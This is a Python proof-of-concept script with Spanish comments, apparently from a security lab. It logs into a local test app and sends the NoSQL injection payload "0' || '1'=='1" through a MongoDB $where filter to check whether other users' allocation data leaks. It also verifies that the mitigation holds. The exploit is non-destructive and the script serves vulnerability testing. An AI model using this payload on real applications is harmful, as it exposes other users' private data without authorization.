#!/usr/bin/env python3
"""V2 - NoSQL Injection (Server-Side JS via $where). Dueno: Bryan. OWASP A05:2025.

Uso: SOLO contra la instancia LOCAL del laboratorio. La contrasena se pasa por
variable de entorno (no se hardcodea en el repo):
  POC_PASS=<clave> python3 poc-scripts/v2_nosqli.py                      # :4000 vulnerable
  BASE=http://localhost:4001 POC_PASS=<clave> python3 poc-scripts/v2_nosqli.py  # :4001 mitigada

Variables: BASE (def. http://localhost:4000), POC_USER (def. admin),
POC_PASS (obligatoria), POC_UID (userId en la URL, def. 1).

Que demuestra
-------------
GET /allocations/<userId>?threshold=<...> concatenaba 'threshold' sin sanitizar
dentro de una clausula $where de MongoDB (allocations-dao.js). $where ejecuta
JavaScript en el servidor de la BD, asi que una entrada como
  0' || '1'=='1
convierte el filtro en una condicion siempre verdadera y devuelve las
asignaciones de TODOS los usuarios, no solo las del userId pedido.

Metodo (solo lectura, sin payloads destructivos - nada de bucles/DoS)
--------------------------------------------------------------------
1. Login con una cuenta demo del laboratorio.
2. Linea base: threshold=0  -> solo las filas del propio userId.
3. Inyeccion: threshold con condicion booleana verdadera -> si devuelve MAS
   filas (datos de otros usuarios), el $where ejecuto la entrada = VULNERABLE.
4. Regresion: threshold=10 (entero valido) -> la funcionalidad legitima sigue
   devolviendo datos propios.

Codigo de salida: 1 = vulnerable, 0 = mitigado, 2 = error (p.ej. login fallido).
"""
import os
import re
import sys
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar

BASE = os.environ.get("BASE", "http://localhost:4000").rstrip("/")
USER = os.environ.get("POC_USER", "admin")
PASSWORD = os.environ.get("POC_PASS")                 # obligatoria, sin valor por defecto
USER_ID = os.environ.get("POC_UID", "1")
INJECTION = "0' || '1'=='1"                            # condicion siempre verdadera

ROW_RE = re.compile(r"Asset Allocations for ([^<]+)")


def build_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def login(opener):
    data = urllib.parse.urlencode({"userName": USER, "password": PASSWORD}).encode()
    req = urllib.request.Request(f"{BASE}/login", data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    with opener.open(req, timeout=15) as r:
        return r.status


def allocations(opener, threshold):
    """Devuelve (status_http, html). Captura los 4xx/5xx sin lanzar."""
    qs = urllib.parse.urlencode({"threshold": threshold})
    url = f"{BASE}/allocations/{USER_ID}?{qs}"
    try:
        with opener.open(url, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def rows(html):
    return [n.strip() for n in ROW_RE.findall(html)]


def main():
    if not PASSWORD:
        print("[V2] ERROR: define POC_PASS con la clave de la cuenta demo. "
              "Ej: POC_PASS=<clave> python3 poc-scripts/v2_nosqli.py")
        return 2

    opener = build_opener()
    try:
        login(opener)
    except Exception as e:
        print(f"[V2] ERROR de login contra {BASE}: {e}")
        return 2

    _, base_html = allocations(opener, "0")
    base_rows = rows(base_html)

    # Guard: si la linea base esta vacia, el login fallo o el seed es distinto.
    # Sin este control, una app a medias daria 0/0 filas y un falso "MITIGADO".
    if not base_rows:
        print("[V2] ERROR: linea base vacia (login fallido, seed distinto o app no lista). "
              "No se puede concluir.")
        return 2

    inj_status, inj_html = allocations(opener, INJECTION)
    inj_rows = rows(inj_html)

    # Regresion: un entero valido debe ser ACEPTADO (HTTP 200). No se valida el
    # numero de filas: 'stocks' es aleatorio en el seed (1..40), asi que $gt:10
    # puede devolver 0 filas de forma legitima. Lo determinista es el codigo HTTP.
    reg_status, reg_html = allocations(opener, "10")
    reg_rows = rows(reg_html)

    print(f"[V2] Destino: {BASE}  userId={USER_ID}")
    print(f"[V2] Payload threshold: {INJECTION!r}")
    print(f"[V2] Linea base (threshold=0): {len(base_rows)} fila(s) -> {sorted(set(base_rows))}")
    print(f"[V2] Con inyeccion:            HTTP {inj_status}, {len(inj_rows)} fila(s) -> {sorted(set(inj_rows))}")
    print(f"[V2] Regresion (threshold=10): HTTP {reg_status} ({'aceptado' if reg_status == 200 else 'RECHAZADO'}), {len(reg_rows)} fila(s) propia(s)")

    leaked = sorted(set(inj_rows) - set(base_rows))
    if len(inj_rows) > len(base_rows) and leaked:
        print(f"[V2] Datos expuestos de otros usuarios: {leaked}")
        print("[V2] RESULTADO: VULNERABLE - el $where ejecuto la entrada (A05:2025)")
        return 1
    if reg_status != 200:
        print(f"[V2] ADVERTENCIA: un threshold valido (10) fue rechazado (HTTP {reg_status}): posible regresion.")
    print(f"[V2] Inyeccion rechazada (HTTP {inj_status}); un threshold valido se acepta (HTTP {reg_status}).")
    print("[V2] RESULTADO: MITIGADO - la inyeccion no altero el resultado")
    return 0


if __name__ == "__main__":
    sys.exit(main())
